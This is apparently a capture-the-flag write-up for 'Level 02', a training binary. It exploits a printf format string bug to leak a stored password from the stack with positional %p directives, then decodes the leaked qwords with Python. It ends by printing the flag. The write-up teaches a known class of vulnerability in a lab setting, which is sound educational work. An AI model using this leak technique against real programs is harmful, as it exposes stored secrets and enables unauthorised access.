# Level 02 — format string password leak

## Overview
A 64-bit binary reads a password from a file and compares it to user input
with `strncmp`. Before the check, it prints the username with a **format
string vulnerability** (`printf(s)` with user-controlled `s`). We abuse it to
leak the password straight out of memory.

## Analysis
```sh
strings level02      # fopen/fclose/strncmp, "system"+"/bin/sh", "Greetings, %s!"
```
Decompiled logic:
```c
if ( strncmp(ptr, s2, 0x29u) != 0 ) {   // 0x29 = 41-byte password
    printf(s);                           // <-- vulnerable: s is user input
    puts(" does not have access!");
    exit(1);
}
printf("Greetings, %s!\n", s);
system("/bin/sh");
```
Because `printf(s)` interprets our input as a format string, we can read the
stack with `%p` directives — and the password (loaded via `fread`) sits there.

## Locating the password on the stack
```sh
objdump -d level02 | less
# main loads the password buffer relative to rbp:
400909:  lea  -0xa0(%rbp),%rax
```
`-0xa0` from `rbp` maps to the **22nd** positional format argument. The 41-byte
password spans arguments 22–26.

## Leaking
```sh
(python -c 'print "%22$p|%23$p|%24$p|%25$p|%26$p|%27$p"'; echo aaa) | ./level02
```
Output:
```
0x756e505234376848|0x45414a3561733951|0x377a7143574e6758|0x354a35686e475873|0x48336750664b394d|(nil)
```

## Decoding
Each leaked 64-bit value holds 8 bytes of the password in little-endian order.
Reverse each qword and concatenate:
```sh
python -c '
vals = [0x756e505234376848, 0x45414a3561733951, 0x377a7143574e6758,
        0x354a35686e475873, 0x48336750664b394d]
out = ""
for v in vals:
    out += ("%016x" % v).decode("hex")[::-1]
print out
'
```
The decoded string is the level03 password — enter it when prompted to spawn
the shell, or use it directly.

> `rbp_pos.jpeg` shows the stack/`rbp` layout used to find the `%22$` offset.

## Flag
```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
